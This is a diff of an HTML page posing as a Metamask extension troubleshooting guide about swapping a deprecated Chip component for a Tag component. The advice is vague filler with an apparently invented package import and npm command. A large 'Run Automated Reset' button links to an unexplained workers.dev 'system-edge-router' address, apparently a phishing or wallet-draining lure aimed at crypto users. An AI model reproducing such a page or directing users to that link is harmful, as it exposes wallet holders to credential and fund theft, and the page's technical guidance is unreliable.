@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -41,30 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension is displaying a warning or error message indicating that the Chip component is deprecated and should be replaced with the Tag component from the component-library.</li>
+<li>The user encounters an error message indicating that the Chip component is deprecated and needs to be replaced with the Tag component from the component-library in the Metamask extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported or maintained, and the Metamask extension is using an outdated version of this component. The component-library has introduced a new Tag component that provides similar functionality and should be used instead.</li>
+<li>The error occurs because the Chip component is no longer supported and has been replaced by the Tag component, which offers improved functionality and compatibility with the latest Ethereum (ETH) ecosystem updates.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the import statement to use the Tag component from the component-library.</li>
-<li>Replace all instances of the Chip component with the Tag component in the code.</li>
-<li>Configure the Tag component with the required properties, such as label and onClose, as shown in the following example:</li>
+<li>Update the import statement to use the Tag component: </li>
+<li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
+<li>Modify the component usage to match the new Tag component API</li>
+<li>Verify that all dependencies are updated to the latest version</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;label&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Tag&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;onClose&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">()</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">co</span><span class="kc">ns</span><span class="err">ole.log(</span><span class="s2">&quot;Tag closed&quot;</span><span class="err">)</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag@latest
 </code></pre></div>
 
-<p>Consider utilizing an external console to further diagnose and resolve the issue. </p>
+<p>Consider utilizing an external console for further debugging and exploration of the component-library documentation.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Familiarity with the component-library and its components</li>
-<li>Basic knowledge of JavaScript and JSON configuration files</li>
+<li>Node.js (version 16 or higher) installed on the system</li>
+<li>npm (version 8 or higher) installed on the system</li>
+<li>Metamask extension source code accessed and editable</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
